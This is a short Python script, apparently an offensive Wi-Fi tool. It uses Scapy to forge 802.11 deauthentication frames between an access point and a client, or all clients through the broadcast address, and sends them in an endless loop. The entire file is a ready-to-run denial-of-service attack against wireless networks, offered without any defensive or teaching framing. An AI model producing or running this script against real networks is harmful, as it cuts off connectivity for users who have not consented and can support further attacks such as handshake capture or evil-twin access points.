
# Import Module
from scapy.all import *

# Access Point MAC Address
print 'Enter access point MAC address:'
ap = raw_input()

# Client MAC Address
print 'Enter client MAC address, enter FF:FF:FF:FF:FF:FF if you dont know client address:'
client = raw_input()

#Enter which network interface
print 'Enter which interface you would like to use:'
interface = raw_input()

# Deauthentication Packet For Access Point
deauthAccess = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()

# Deauthentication Packet For Client
deauthClient = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()


# send Packets To Access Point and Client

while True:
	sendp(deauthAccess, iface=interface)
	sendp(deauthClient, iface=interface)


